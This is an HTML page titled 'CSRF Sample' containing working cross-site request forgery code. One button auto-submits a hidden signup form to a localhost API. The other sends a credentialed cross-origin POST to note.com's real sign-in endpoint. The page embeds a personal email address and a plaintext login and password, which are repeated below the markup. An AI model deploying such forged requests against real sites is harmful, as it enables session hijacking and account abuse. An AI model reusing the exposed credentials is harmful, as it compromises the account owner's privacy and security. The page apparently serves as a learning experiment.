<html>
  <body>
    <h1>CSRF Sample</h1>

    <form action="https://localhost:3336/api/v1/user/signup" method="POST" style="margin-bottom:24px">
      <input type="hidden" name="email" value="kou0407hei@gmail.com" />
    </form>
    <button id="button1" type="submit">同期Submit</button>
    <button id="button2" type="submit">非同期 Submit</button>
  </body>
  <style>
    input,button {
      cursor:pointer;
    }
  </style>

  <script>
  const button1 = document.getElementById('button1')
  const button2 = document.getElementById('button2');


  function CSRF1() {
    console.log("form submitted");
    document.forms[0].submit();
  }

  function CSRF2() {
    const data = JSON.stringify({"follow": "", "likable_id": "", "likables": "", "login": "benzen6kaku", "magazine_follow": "", "password": "chemisterchemikota6", "redirect_path": "/logout"});
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://note.com/api/v1/sessions/sign_in");
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.withCredentials = true;

    xhr.send(data)

    console.log('button clicked');
  }



  button1.addEventListener('click', CSRF1);
  button2.addEventListener('click', CSRF2);
  </script>
</html>

follow: null
likable_id: null
likables: null
login: "benzen6kaku"
magazine_follow: null
password: "chemisterchemikota6"
redirect_path: "/logout"

779327